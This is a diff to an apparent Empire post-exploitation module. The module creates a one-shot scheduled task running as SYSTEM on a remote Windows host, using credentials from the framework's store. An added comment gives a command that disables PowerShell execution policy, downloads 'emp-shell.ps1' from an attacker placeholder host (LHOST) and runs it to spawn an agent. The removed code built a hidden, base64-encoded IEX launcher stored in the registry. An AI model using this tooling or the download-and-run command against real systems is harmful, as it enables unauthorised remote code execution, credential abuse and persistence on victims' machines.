@@ -1,5 +1,6 @@
 import os
 import datetime
+from lib.common import helpers
 
 class Module:
 
@@ -25,7 +26,11 @@ class Module:
             'MinLanguageVersion' : '2',
             
             'Comments': [
-                'https://github.com/mattifestation/PowerSploit/blob/master/Persistence/Persistence.psm1'
+                'The module schedules a task to run once and immediately on the target host.',
+                'IMPORTANT: The TimeZone may have to be adjusted if the target and the attacker are on different time zones!',
+                'TIPS: If you want to spawn an Empire agent, this can be acomplished with something like',
+                'set Command "powershell.exe -Command Set-ExecutionPolicy -ExecutionPolicy Unrestricted;mkdir c:\k; wget http://LHOST/emp-shell.ps1 -o C:\k\emp.ps1;C:\k\emp.ps1"',
+                'This module is base upon work by  @mattifestation, @harmj0y',
             ]
         }
 
@@ -37,25 +42,20 @@ class Module:
                 'Description'   :   'Agent to run module on.',
                 'Required'      :   True,
                 'Value'         :   ''
-            },
-            'Listener' : {
-                'Description'   :   'Listener to use.',
-                'Required'      :   False,
-                'Value'         :   ''
-            },
+            },            
             'TaskName' : {
                 'Description'   :   'Name to use for the schtask.',
                 'Required'      :   True,
                 'Value'         :   'Updater'
             },
-            'RegPath' : {
-                'Description'   :   'Registry location to store the script code. Last element is the key name.',
+            'CredID' : {
+                'Description'   :   'CredID from the store to use.',
                 'Required'      :   False,
-                'Value'         :   'HKCU:\Software\Microsoft\Windows\CurrentVersion\debug'
+                'Value'         :   ''                
             },
             'ComputerName' : {
                 'Description'   :   'Computer name (if not supplied, localhost will be used)',
-                'Required'      :   False,
+                'Required'      :   True,
                 'Value'         :   ''
             },
             'UserName' : {
@@ -80,10 +80,9 @@ class Module:
             },
             'Command' : {
                 'Description'   :   'Optional command, if specified it will be executed instead of the Empire stager',
-                'Required'      :   False,
+                'Required'      :   True,
                 'Value'         :   ''
             }     
-
         }
 
         # save off a copy of the mainMenu object to access external functionality
@@ -98,18 +97,35 @@ class Module:
 
 
     def generate(self, obfuscate=False, obfuscationCommand=""):
-        
-        listenerName = self.options['Listener']['Value']
-        
-        # trigger options
-        taskName = self.options['TaskName']['Value']
-    
-        # storage options
-        regPath = self.options['RegPath']['Value']
 
+
+        # if a credential ID is specified, try to parse
+        credID = self.options["CredID"]['Value']
+        if credID != "":
+            
+            if not self.mainMenu.credentials.is_credential_valid(credID):
+                print helpers.color("[!] CredID is invalid!")
+                return ""
+
+            (credID, credType, domainName, userName, password, host, os, sid, notes) = self.mainMenu.credentials.get_credentials(credID)[0]
+
+            if domainName != "":
+                self.options["UserName"]['Value'] = str(domainName) + "\\" + str(userName)
+            else:
+                self.options["UserName"]['Value'] = str(userName)
+            if password != "":
+                self.options["Password"]['Value'] = password
+
+               
+        # set credentials
         computerName = self.options['ComputerName']['Value']
         userName = self.options['UserName']['Value']
         password = self.options['Password']['Value']
+
+
+        # trigger options
+        taskName = self.options['TaskName']['Value']
+    
 
         # time adjustments
         timeZone = self.options['TimeZone']['Value']
@@ -118,57 +134,21 @@ class Module:
         command = self.options['Command']['Value']
 
         statusMsg = ""
-        locationString = ""
-
-        # Use a listener
-        if not self.mainMenu.listeners.is_listener_valid(listenerName):
-	    # not a valid listener, return nothing for the script
-	    print helpers.color("[!] Invalid listener: " + listenerName)
-	    return ""
-
-        else:
-	    # generate the PowerShell one-liner with all of the proper options set
-	    launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent='default', proxy='default', proxyCreds='default')
-	
-	encScript = launcher.split(" ")[-1]
-	statusMsg += "using listener " + listenerName
-
-
-        # otherwise store the script into the specified registry location
-        path = "\\".join(regPath.split("\\")[0:-1])
-        name = regPath.split("\\")[-1]
-
-        statusMsg += " stored in " + regPath
-
-        script = "$RegPath = '"+regPath+"';"
-        script += "$parts = $RegPath.split('\\');"
-        script += "$path = $RegPath.split(\"\\\")[0..($parts.count -2)] -join '\\';"
-        script += "$name = $parts[-1];"
-        script += "$null=Set-ItemProperty -Force -Path $path -Name $name -Value "+encScript+";"
-
-        # note where the script is stored
-        locationString = "(gp "+path+" "+name+")."+name
-
-        # built the command that will be triggered by the schtask
-        if command != '':
-            triggerCmd = command
-        else:
-            triggerCmd = "'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -c \\\"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String("+locationString+")))\\\"'"
        
         # sanity check to make sure we haven't exceeded the cmd.exe command length max
-        if len(triggerCmd) > 259:
+        if len(command) > 259:
             print helpers.color("[!] Warning: trigger command exceeds the maximum of 259 characters.")
             return ""
 
         runTime = datetime.datetime.today() + datetime.timedelta(hours = int(timeZone)) + datetime.timedelta(minutes = int(minuteAdjustment))
         nowTime = datetime.datetime.strftime(runTime , '%H:%M')
 
-        schTaskCmd = "schtasks /Create /F /SC once"+ " /S " + computerName + " /U "+userName+" /P "+password + " /RU system /ST "+nowTime+" /TN "+taskName+" /TR "+triggerCmd+";"
-        script += schTaskCmd
+        script = "schtasks /Create /F /SC once"+ " /S " + computerName + " /U "+userName+" /P "+password + " /RU system /ST "+nowTime+" /TN "+taskName+" /TR "+command+";"
         statusMsg += " with "+taskName+" run at " + nowTime + " (Ensure this is the correct time on the target!)."
-        print "COMMAND : " + schTaskCmd
+        print "COMMAND : " + script
+        print statusMsg
 
-        script += "'Schtasks persistence established "+statusMsg+"'"
         if obfuscate:
             script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
+
         return script
